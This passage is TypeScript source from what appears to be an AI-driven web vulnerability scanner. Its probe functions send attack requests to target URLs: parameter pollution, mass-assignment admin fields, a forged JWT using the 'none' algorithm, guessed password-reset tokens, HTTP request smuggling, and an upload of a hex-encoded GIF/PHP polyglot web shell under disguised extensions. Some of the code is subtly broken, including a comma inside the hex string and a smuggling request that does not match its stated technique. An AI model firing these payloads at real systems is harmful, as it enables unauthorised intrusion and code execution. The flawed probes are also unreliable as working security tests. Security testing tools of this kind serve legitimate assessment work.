    param_pollution_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // HTTP Parameter Pollution — duplicate parameters with conflicting values
        const base = await httpRequest(session, url, 'userA');

        // Extract existing query params
        const urlObj = new URL(url);
        const params = Array.from(urlObj.searchParams.keys());

        if (params.length === 0) {
            // Add test parameter if none exist
            params.push('id', 'role', 'action');
        }

        for (const param of params.slice(0, 3)) {
            // Duplicate the parameter with a different value
            const pollutedUrl = url.includes('?')
                ? `${url}&${param}=admin&${param}=test`
                : `${url}?${param}=admin&${param}=test`;

            const polluted = await httpRequest(session, pollutedUrl, 'userA');

            // Check if pollution caused different behavior
            const diff = calculateDiff(base.bodySnippet, polluted.bodySnippet);
            if (
                (polluted.status !== base.status && polluted.status < 500) ||
                (diff > 0.3 && polluted.status === 200)
            ) {
                await maybeAddFinding(session, {
                    type: 'param_pollution',
                    url: pollutedUrl,
                    severity: 'medium',
                    evidence: `HTTP Parameter Pollution: duplicating '${param}' caused behavioral change (diff: ${diff.toFixed(2)}, status: ${base.status}→${polluted.status}).`,
                    aiExplanation: action.explanation,
                    metrics: { diffScore: diff },
                });
                break;
            }
        }
    },

    api_abuse_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test for rate limiting bypass, mass assignment, and enumeration

        // 1. Rate limiting check — send 10 rapid requests
        const rapidResults = [];
        for (let i = 0; i < 10; i++) {
            rapidResults.push(httpRequest(session, url, 'userA'));
        }
        const responses = await Promise.all(rapidResults);
        const allSuccess = responses.every(r => r.status >= 200 && r.status < 400);
        const noRateLimit = !responses.some(r => r.status === 429);

        if (allSuccess && noRateLimit && responses.length === 10) {
            await maybeAddFinding(session, {
                type: 'api_abuse',
                url,
                severity: 'low',
                evidence: 'No rate limiting detected: 10 rapid requests all succeeded (no 429 response).',
                aiExplanation: action.explanation,
            });
        }

        // 2. Mass assignment — try adding extra fields on POST/PUT
        const massPayload = JSON.stringify({
            role: 'admin',
            isAdmin: true,
            privilege: 'superuser',
            _internal: true,
        });

        const massRes = await httpRequest(session, url, 'userA', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            data: massPayload,
        });

        if (massRes.status >= 200 && massRes.status < 300) {
            // Check if response reflects the injected fields
            if (
                massRes.bodySnippet.includes('"role":"admin"') ||
                massRes.bodySnippet.includes('"isAdmin":true') ||
                massRes.bodySnippet.includes('"privilege"')
            ) {
                await maybeAddFinding(session, {
                    type: 'api_abuse',
                    url,
                    severity: 'critical',
                    evidence: 'Mass assignment vulnerability: injected privileged fields (role, isAdmin) reflected in response.',
                    aiExplanation: action.explanation,
                });
            }
        }
    },

    jwt_manipulation_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test for JWT weaknesses: none algorithm, missing verification, algorithm confusion
        const baseRes = await httpRequest(session, url, 'userA');
        
        // Extract JWT from response headers or body
        let jwt: string | undefined;
        const jwtPatterns = [
            /Authorization["']?\s*:\s*Bearer\s+([a-zA-Z0-9._-]+)/i,
            /["']token["']?\s*:\s*["']?([a-zA-Z0-9._-]+)["']?/,
            /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/,
        ];

        for (const pattern of jwtPatterns) {
            const match = pattern.exec(baseRes.bodySnippet) || pattern.exec(JSON.stringify(baseRes.headers));
            if (match) {
                jwt = match[1] || match[0];
                break;
            }
        }

        if (!jwt) return;

        // Test 1: None algorithm
        const noneAlg = 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.';
        const noneRes = await httpRequest(session, url, 'userA', {
            headers: { Authorization: `Bearer ${noneAlg}` },
        });

        if (noneRes.status >= 200 && noneRes.status < 300 && noneRes.bodySnippet !== baseRes.bodySnippet) {
            await maybeAddFinding(session, {
                type: 'jwt_manipulation',
                url,
                severity: 'critical',
                evidence: 'JWT "none" algorithm accepted - signature verification might be disabled.',
                aiExplanation: action.explanation,
            });
            return;
        }
    },

    rate_limit_bypass_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test rate limiting bypass via headers or rapid requests
        const requests = [];
        for (let i = 0; i < 10; i++) {
            requests.push(httpRequest(session, url, 'userA'));
        }

        const results = await Promise.allSettled(requests);
        const successCount = results.filter(
            r => r.status === 'fulfilled' && r.value.status >= 200 && r.value.status < 300,
        ).length;

        if (successCount >= 9) {
            await maybeAddFinding(session, {
                type: 'rate_limit_bypass',
                url,
                severity: 'medium',
                evidence: `Made ${successCount}/10 requests without rate limit rejection. Possible rate limiting bypass.`,
                aiExplanation: action.explanation,
            });
        }
    },

    password_reset_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test for password reset vulnerabilities
        if (!url.toLowerCase().includes('password') && !url.toLowerCase().includes('reset')) return;

        const resetPayloads = [
            { uid: 'admin', token: 'reset123' },
            { user_id: 1, reset_code: 'test' },
            { email: 'admin@example.com', code: 'anything' },
        ];

        for (const payload of resetPayloads) {
            const res = await httpRequest(session, url, 'guest', {
                method: 'POST',
                data: JSON.stringify(payload),
                headers: { 'Content-Type': 'application/json' },
            });

            if (res.status >= 200 && res.status < 300 && res.bodySnippet.toLowerCase().includes('success')) {
                await maybeAddFinding(session, {
                    type: 'auth_bypass',
                    url,
                    severity: 'critical',
                    evidence: `Password reset accepted without proper validation. Payload: ${JSON.stringify(payload)}`,
                    aiExplanation: action.explanation,
                });
                break;
            }
        }
    },

    file_upload_polyglot_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test file upload vulnerabilities using polyglot payloads
        if (!url.toLowerCase().includes('upload') && !url.toLowerCase().includes('file')) return;

        // Polyglot payload: valid image + executable code
        const polyglotPayload = Buffer.from(
            '47494638396101000100800000ffffff00000000,feff003c3f706870207379' +
            '73746d28245f474554' +
            '5b2263222b5c223e5c223d5c223e5c223e5c223e5c223e5c223e5c223e5c223e' +
            '5c223e5c223e5c223e5c223e5c223e5c223e5c223e5c223e5c223e5c223e5c22' +
            '3e202d206f6e6520706176206f6629203f3e',
            'hex'
        ).toString();

        // Try uploading with different extensions
        const extensions = ['php.jpg', 'jpg.php', 'php%00.jpg'];
        for (const ext of extensions) {
            try {
                const formData = new FormData();
                formData.append('file', new Blob([polyglotPayload]), `test.${ext}`);

                const res = await httpRequest(session, url, 'userA', {
                    method: 'POST',
                    data: formData,
                });

                if (res.status >= 200 && res.status < 300 && res.bodySnippet.includes(ext)) {
                    await maybeAddFinding(session, {
                        type: 'file_upload',
                        url,
                        severity: 'high',
                        evidence: `File upload accepted with suspicious extension: ${ext}. Polyglot payload might be executable.`,
                        aiExplanation: action.explanation,
                    });
                    break;
                }
            } catch {
                // Skip invalid attempts
            }
        }
    },

    http_smuggling_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test for HTTP request smuggling via CL.TE, TE.CL, TE.TE techniques
        const smugglePayload = 'POST /admin HTTP/1.1\r\nHost: example.com\r\nContent-Length: 5\r\n\r\nadmin';

        try {
            const res = await httpRequest(session, url, 'userA', {
                data: smugglePayload,
                headers: {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0',
                },
            });

            // If backend processes the smuggled request
            if (res.status >= 200 && (res.bodySnippet.includes('admin') || res.status === 403)) {
                await maybeAddFinding(session, {
                    type: 'http_smuggling',
                    url,
                    severity: 'high',
                    evidence: 'Possible HTTP request smuggling detected via CL.TE technique.',
                    aiExplanation: action.explanation,
                });
            }
        } catch {
            // Ignore errors in smuggling attempts
        }
    },
};
